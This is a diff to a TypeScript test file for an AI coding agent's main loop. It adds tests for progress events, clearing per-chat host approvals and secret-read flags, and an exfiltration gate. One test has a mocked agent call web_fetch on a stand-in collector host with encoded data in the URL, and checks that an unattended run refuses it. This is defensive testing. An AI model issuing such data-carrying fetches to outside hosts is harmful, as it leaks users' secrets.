@@ -9,11 +9,24 @@ import type { KeepUndoCodeLensProvider } from '../../src/sidebar/KeepUndoCodeLen
 import type { ToolFailureTracker } from '../../src/tools/StripTools';
 import type { DiffDecorations } from '../../src/sidebar/DiffDecorations';
 import { ToolRegistry } from '../../src/tools/ToolRegistry';
+import { makeWebFetchTool } from '../../src/tools/fetchTool';
+import { unattendedConversations } from '../../src/sidebar/unattendedConversations';
 import { partialToolPath } from '../../src/sidebar/toolCallProgress';
 import type { CliAgentDriver } from '../../src/agents/CliAgentDriver';
+import type { AgentProgressEvent } from '../../src/sidebar/AgentProgress';
 import { fakeClaudeCli } from '../support/fakeCli';
 import * as path from 'path';
 import { TemplateEngine } from '../../src/llm/TemplateEngine';
+import {
+  approvedHostsFor,
+  clearConversationHostApprovals,
+  markHostApproved,
+} from '../../src/tools/fetchHostApprovals';
+import {
+  clearConversationSecretState,
+  hasConversationReadSecret,
+  markConversationReadSecret,
+} from '../../src/tools/exfilTaint';
 
 const FAKE_CLAUDE_CLI = fakeClaudeCli();
 
@@ -87,7 +100,15 @@ function makeBackend(): BackendController {
   };
 }
 
-function makePool(acquireImpl?: (modelName: string) => Promise<BackendController>): IBackendPool {
+function makePool(
+  acquireImpl?: (modelName: string) => Promise<BackendController>,
+  /** Is this model being served right now? The real pool answers it for its
+   *  own surfaces (`sidebarPayloads.ts`, `contactPrompt.ts`); the fake keeps
+   *  the method so the harness still matches `IBackendPool`. Default `false`:
+   *  nothing is loaded, which is what every case here assumes.
+   */
+  modelReady = false,
+): IBackendPool {
   return {
     acquire: acquireImpl ?? (async () => makeBackend()),
     canDelegate: () => ({ ok: false, reason: 'unsupported' }) as never,
@@ -103,7 +124,7 @@ function makePool(acquireImpl?: (modelName: string) => Promise<BackendController
     loadedModelNames: () => [],
     loadedModelsExcept: () => [],
     isLoaded: () => false,
-    isModelReady: () => false,
+    isModelReady: () => modelReady,
     backendProcesses: () => [],
     residencySignature: () => '',
   };
@@ -245,6 +266,37 @@ describe('AgentLoop', () => {
 
     expect(conv.messages[0]?.internal).toBeUndefined();
   });
+
+  it('announces the turn on the progress bus before anything it says (audit F4)', async () => {
+    completeTurnImmediately();
+    const conv = makeConversation();
+    const config = makeConfig();
+    const loop = makeLoop(makePool(), config);
+    const seen: AgentProgressEvent[] = [];
+    const subscription = loop.onAgentProgress((event) => seen.push(event));
+
+    await loop.runTurn(conv, config.models[0]!, 'a timed prompt');
+    subscription.dispose();
+
+    // A turn that names no tool and says nothing emits only its closing event,
+    // so without this the bus could not tell when it began and reported every
+    // such turn as lasting 0 s. The start has to come first: a snapshot built
+    // from a later event cannot know when the turn started.
+    expect(seen.filter((event) => event.kind === 'start')).toHaveLength(1);
+    expect(seen[0]?.kind).toBe('start');
+    expect(seen[0]?.conversationId).toBe(conv.id);
+
+    // An `internal` send is the auto-compaction resume of the task already
+    // running - the same boundary `midTurnTells.onTaskStart` uses - so it must
+    // not open a second turn.
+    const resume: AgentProgressEvent[] = [];
+    const second = loop.onAgentProgress((event) => resume.push(event));
+    await loop.runTurn(conv, config.models[0]!, 'Continue the active task.', undefined, {
+      internal: true,
+    });
+    second.dispose();
+    expect(resume.filter((event) => event.kind === 'start')).toHaveLength(0);
+  }, 20_000);
 
   it('says nothing about starting a backend the warm pool hands over instantly', async () => {
     completeTurnImmediately();
@@ -496,32 +548,28 @@ describe('AgentLoop', () => {
     expect(post).toHaveBeenCalledWith(expect.objectContaining({ type: 'done', finishReason: 'cancelled', conversationId: conv.id }));
   });
 
-  it('does not commit or launch a CLI prompt when rollback preparation fails', async () => {
-    const run = vi.fn();
+  it('runs direct CLI chat without invoking Forge rollback preparation', async () => {
+    const run = vi.fn(async () => ({ status: 'completed' as const, finalText: 'Done.' }));
     const driver = { run } as unknown as CliAgentDriver;
     const config = makeConfig({ provider: 'cli', cli: FAKE_CLAUDE_CLI });
     const conv = makeConversation();
     const post = vi.fn();
-    const checkpoint = {
-      prepareWorkspace: vi.fn(async () => {
-        throw new Error('checkpoint limit exceeded');
-      }),
-    };
     const checkpoints = {
-      beginTurn: vi.fn(() => checkpoint),
+      beginTurn: vi.fn(() => {
+        throw new Error('direct CLI chat must not prepare a checkpoint');
+      }),
       commitTurn: vi.fn(),
       depth: vi.fn().mockReturnValue(0),
     } as unknown as CheckpointStack;
     const loop = makeLoop(makePool(), config, post, new ToolRegistry(), driver, checkpoints);
 
-    await loop.runTurn(conv, config.models[0]!, 'do not record this');
+    await loop.runTurn(conv, config.models[0]!, 'run this');
 
-    expect(run).not.toHaveBeenCalled();
-    expect(conv.messages).toEqual([]);
-    expect(post).not.toHaveBeenCalledWith(expect.objectContaining({ type: 'ready' }));
-    expect(post).toHaveBeenCalledWith(
-      expect.objectContaining({ type: 'error', message: 'checkpoint limit exceeded' }),
-    );
+    expect(run).toHaveBeenCalledOnce();
+    expect(checkpoints.beginTurn).not.toHaveBeenCalled();
+    expect(checkpoints.commitTurn).not.toHaveBeenCalled();
+    expect(conv.messages.some((message) => message.role === 'user')).toBe(true);
+    expect(post).toHaveBeenCalledWith(expect.objectContaining({ type: 'ready' }));
   });
 
   it('reuses the CLI session for later turns in the same Forge conversation', async () => {
@@ -583,25 +631,24 @@ describe('AgentLoop', () => {
 
     const countType = (type: string): number =>
       post.mock.calls.filter(([m]) => (m as { type?: string }).type === type).length;
-    const countRollbackWarnings = (): number =>
-      post.mock.calls.filter(([m]) =>
-        /rollback protection is disabled/i.test((m as { detail?: string }).detail ?? ''),
-      ).length;
 
     await loop.runTurn(conv, config.models[0]!, 'first prompt');
     const startsAfterFirst = countType('backendStarting');
     const readysAfterFirst = countType('ready');
-    const warningsAfterFirst = countRollbackWarnings();
 
     await loop.runTurn(conv, config.models[0]!, 'second prompt');
 
     expect(startsAfterFirst).toBe(1);
     expect(readysAfterFirst).toBe(1);
-    expect(warningsAfterFirst).toBe(1);
-    // Resumed turn adds no further start/ready/rollback chatter.
+    // Resumed turn adds no further start/ready chatter or checkpoint activity.
     expect(countType('backendStarting')).toBe(1);
     expect(countType('ready')).toBe(1);
-    expect(countRollbackWarnings()).toBe(1);
+    expect(countType('checkpointReady')).toBe(0);
+    expect(
+      post.mock.calls.some(([m]) =>
+        /rollback checkpoint/i.test((m as { detail?: string }).detail ?? ''),
+      ),
+    ).toBe(false);
   });
 
   it('runs a second CLI conversation while the first conversation is still waiting', async () => {
@@ -765,7 +812,7 @@ describe('AgentLoop', () => {
     const conv = makeConversation();
     const config = makeConfig({ tool_call_limits: { budget_test_tool: 1 } });
     const loop = makeLoop(makePool(), config, vi.fn(), registry);
-    loop.setClankerMode(true); // bypass the confirm-UI gate; unrelated to the budget under test
+    loop.setClankerMode(conv.id, true); // bypass the confirm-UI gate; unrelated to the budget under test
 
     await loop.runTurn(conv, config.models[0]!, 'run it twice');
 
@@ -850,4 +897,110 @@ describe('AgentLoop', () => {
     expect(conv.last_output_tokens).toBe(10);
     expect(conv.model_request_count).toBe(3);
   });
+});
+
+// The hosts this chat approved and the "this chat has read a secret" flag are
+// chat-scoped, like the history: the lifecycle ledger in
+// docs/plans/EXFIL_GATES_PLAN.md says they go with the chat when it closes, not
+// only when `/clearChat` runs. Left behind, a closed chat's taint would gate a
+// brand-new chat for a read it never made, and its approved hosts would let a
+// new chat reach a collector nobody was asked about.
+describe('closing a chat drops what belonged to it', () => {
+  afterEach(() => {
+    clearConversationHostApprovals();
+    clearConversationSecretState();
+  });
+
+  it('clears the hosts it approved and the secret-read flag', async () => {
+    const loop = makeLoop(makePool(), makeConfig());
+    markHostApproved('conv-close', 'pypi.org');
+    markConversationReadSecret('conv-close');
+    expect(approvedHostsFor('conv-close')).toEqual(['pypi.org']);
+    await loop.disposeConversation('conv-close');
+    expect(approvedHostsFor('conv-close')).toEqual([]);
+    expect(hasConversationReadSecret('conv-close')).toBe(false);
+  });
+});
+
+// The card's own reason and alternative have to reach the refusal. `ToolDispatch`
+// passes the gate's `gateKind`, `cardReason`, decline alternative and decision
+// callback as a SIXTH argument to the approval adapter; an adapter written with
+// five parameters against that signature type-checks and silently drops all four.
+// The live security test of 2026-10-28 caught it from outside (case 7): a
+// dangerous `web_fetch` lost its reason line, so the answer was made about a
+// card whose whole point had been stripped. Asserted through `AgentLoop`
+// because that is where the wiring lives; a test that builds its own adapter
+// would pass whatever the wiring did.
+describe('an unattended run refuses the gate in the gate\'s own words', () => {
+  const PAYLOAD_URL = `https://collector.invalid/?d=${'a'.repeat(48) + '1'.repeat(48)}`;
+
+  it('refuses at once naming the reason and the alternative, and asks no model', async () => {
+    const conv = makeConversation();
+    const config = {
+      ...makeConfig(),
+      permissions: { net: { fetch: true } },
+    } as ForgeConfig;
+    const registry = new ToolRegistry();
+    // The production gate, not a hand-written card: `fetchApprovalFor` is what
+    // decides this URL is dangerous and writes the reason and the alternative
+    // this test then looks for.
+    registry.register(makeWebFetchTool({ getConfig: () => config }));
+    const loop = makeLoop(makePool(), config, vi.fn(), registry);
+
+    let judgeRounds = 0;
+    let agentRounds = 0;
+    streamModelChatCompletion.mockImplementation(
+      (
+        _baseUrl: string,
+        request: unknown,
+        _model: ModelConfig,
+        handlers: {
+          onToken?: (text: string) => void;
+          onDone: (reason: string | null) => void;
+          onToolCalls?: (calls: unknown[] | null) => void;
+        },
+      ) => {
+        const messages =
+          (request as { messages?: { role: string; content: string }[] })?.messages ?? [];
+        const text = messages.map((message) => String(message.content ?? '')).join('\n');
+        if (text.includes('approval judge')) judgeRounds += 1;
+        agentRounds += 1;
+        if (agentRounds === 1) {
+          handlers.onToolCalls?.([
+            {
+              id: 'call-1',
+              type: 'function',
+              function: { name: 'web_fetch', arguments: JSON.stringify({ url: PAYLOAD_URL }) },
+            },
+          ]);
+          handlers.onDone('tool_calls');
+        } else {
+          handlers.onToken?.('carrying on without it');
+          handlers.onDone('stop');
+        }
+        return Promise.resolve();
+      },
+    );
+
+    // Unattended, because that is where the dropped argument showed itself
+    // loudest: `gateKind: 'ownerGate'` is what lets an autonomous run refuse the
+    // call at once instead of parking it on a card nobody is there to answer.
+    const marker = unattendedConversations.mark(conv.id);
+    try {
+      await loop.runTurn(conv, config.models[0]!, 'fetch the collector');
+    } finally {
+      marker.dispose();
+    }
+
+    // No model is asked to decide an approval: nothing may answer a gate only
+    // the owner may answer, and a run parked on that card would hang.
+    expect(judgeRounds).toBe(0);
+    const toolRow = JSON.stringify(conv.messages.filter((m) => m.role === 'tool'));
+    // The gate's own reason line and its own alternative, both carried by that
+    // sixth argument: a refusal naming neither is a refusal the agent cannot
+    // act on, which is the 2026-10-28 failure this wiring is tested against.
+    expect(toolRow).toContain('URL carries 96 characters of encoded data');
+    expect(toolRow).toContain('fetch.allowed_hosts');
+    expect(toolRow).toContain('denied by policy');
+  }, 20_000);
 });
